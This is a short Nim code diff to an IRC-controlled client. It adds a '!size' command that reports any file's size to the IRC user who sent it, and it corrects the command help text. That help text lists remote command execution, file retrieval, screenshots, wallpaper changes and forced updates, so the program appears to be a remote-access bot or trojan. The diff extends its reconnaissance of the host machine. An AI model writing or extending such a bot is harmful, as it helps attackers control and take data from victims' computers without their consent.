@@ -632,6 +632,15 @@ proc cmd_hey(event:IrcEvent, client:AsyncIrc, verbose:bool) {.async.} =
     discard helper_responseHandler(event, client, helper_setResponse(finalmsg, 0))
 
 
+proc cmd_size(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
+    var filename = await helper_recombine(tokens)
+    var output = ""
+    try:
+        var size = getFileSize(filename)
+        output = "[" & filename & "]: " & $size & " B | " & $(size div 1000) & " KB | " & $(size div 1000000) & " MB | " & $(size div 1000000000) & " GB "
+    except OSError as e:
+        output = "ERROR: [" & repr(e) & "]"
+    discard client.privmsg(event.origin, output)
 
 
 ## Checks if a private message was a command and calls appropriate functions
@@ -676,6 +685,8 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
             discard cmd_print(event, client, ftokens, true)
         else:
             discard cmd_print(event, client, tokens, false)
+    of "!size":
+        discard cmd_size(event, client, tokens)
     of "!update":
         discard updt_check(true , client, event, false)
     of "!forceupdate":
@@ -689,7 +700,7 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
     of "!wallpaper":
         discard cmd_wallpaper(event, client, tokens)
     of "!cmds":
-        discard client.privmsg(event.origin, "hey, heyy, lag, excessFlood, dxdiag, r <cmd>, getfio <file>, get <file>, print <file<, update, forceupdate, sendsleep <integer>, screenshot, wallpaper <url>, cmds")
+        discard client.privmsg(event.origin, "hey, heyy, lag, excessFlood, dxdiag, r <cmd>, getfio <file>, get <file>, print <file>, size <file>, update, forceupdate, sendsleep <integer>, screenshot, wallpaper <url>, cmds")
     
 
         
